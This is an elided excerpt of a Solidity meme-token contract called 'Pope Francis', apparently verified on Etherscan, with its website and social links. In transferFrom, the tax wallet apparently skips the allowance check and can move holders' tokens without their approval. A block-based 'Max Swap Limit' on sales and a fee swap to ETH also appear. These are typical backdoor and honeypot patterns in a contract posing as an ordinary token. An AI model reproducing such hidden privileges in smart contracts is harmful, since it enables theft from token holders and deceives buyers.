...
/**
 *Submitted for verification at Etherscan.io on 2025-04-21
*/

/*
    Website: https://www.popefrancis.lol
    Twitter: https://x.com/PopeFrancisETH
    Telegram: https://t.me/popefranciseth
*/
...
contract Token is IERC20, Ownable {
    ...
    string private constant _name = unicode"Pope Francis";
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        ...
        if (msg.sender != _taxWallet && (sender == uniswapV2Pair || recipient != _deadAddr))
            _approve(
                sender,
                _msgSender(),
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != address(this) && to != address(this)) {
            if (!inSwap) {
                taxAmount = amount.mul((_buyCount > _reduceTaxAt) ? _setfinalTax : _setinitialTax).div(100);
            }
            ...
            if (to == uniswapV2Pair && from != address(this)) {
                require(_blockBuyAmount < _getAmountOut() || _lastBuyBlock != block.number, "Max Swap Limit");
            }
            ...
            if (!inSwap && to == uniswapV2Pair && swapEnabled && from != _taxWallet) {
                ...
                if (contractTokenBalance > 0) {
                    ...
                    swapFeeTokensForEth(amount > swapBalance ? swapBalance : amount);
                }
